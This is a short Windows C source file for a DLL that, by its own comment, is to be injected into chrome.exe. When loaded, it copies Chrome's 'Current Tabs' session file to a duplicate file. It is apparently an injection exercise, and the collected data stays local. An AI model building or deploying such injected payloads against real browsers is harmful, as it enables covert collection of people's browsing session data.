//! Injects into chrome.exe and copies
//! current tabs file to new place

#include <windows.h>
#include <Shlobj.h>

void dublicateChromeCurrentTabs(void)
{
	//! Copies  chrome current tabs to new file that
	//! is located under ...\\Current Tabs D

	WCHAR lpwsPath[MAX_PATH] = {0};
	WCHAR lpwsDstPath[MAX_PATH] = {0};

	if(SUCCEEDED(SHGetFolderPath(NULL, 
								 CSIDL_LOCAL_APPDATA, 
								 NULL, 
								 0, 
								 lpwsPath))) 
	{
		lstrcat(lpwsPath, L"\\Google\\Chrome\\User Data\\Default\\Current Tabs");
		lstrcpy(lpwsDstPath, lpwsPath);
		lstrcat(lpwsDstPath, L" D");
		CopyFile(lpwsPath, lpwsDstPath, FALSE);
	}
}

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, PVOID fImpLoad)
{
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH:
			dublicateChromeCurrentTabs();
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
		}
	return TRUE;
}